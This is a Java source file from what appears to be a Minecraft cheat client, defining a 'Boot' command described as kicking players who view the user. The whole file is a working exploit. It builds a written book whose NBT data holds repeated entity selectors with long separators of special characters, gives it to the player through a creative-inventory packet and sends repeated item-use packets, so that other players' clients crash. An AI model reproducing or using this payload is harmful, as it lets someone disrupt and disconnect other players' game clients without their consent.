package net.shadow.client.feature.command.impl;

import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;

public class Boot extends Command {
    public Boot() {
        super("Boot", "kick players who view you", "renderkick");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        ItemStack boot = new ItemStack(Items.WRITTEN_BOOK, 1);
        try {
            boot.setNbt(StringNbtReader.parse("{title:\"bomb\",author:\"unkn0wnhax0r\",pages:['[{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"},{\"selector\":\"@e\",\"separator\":\"￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿￿\"}]']}"));
        } catch (CommandSyntaxException ignored) {
        }
        message("Booting Players...");
        ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(ShadowMain.client.player.getInventory().selectedSlot + 36, boot));
        ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
        ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND));
    }
}
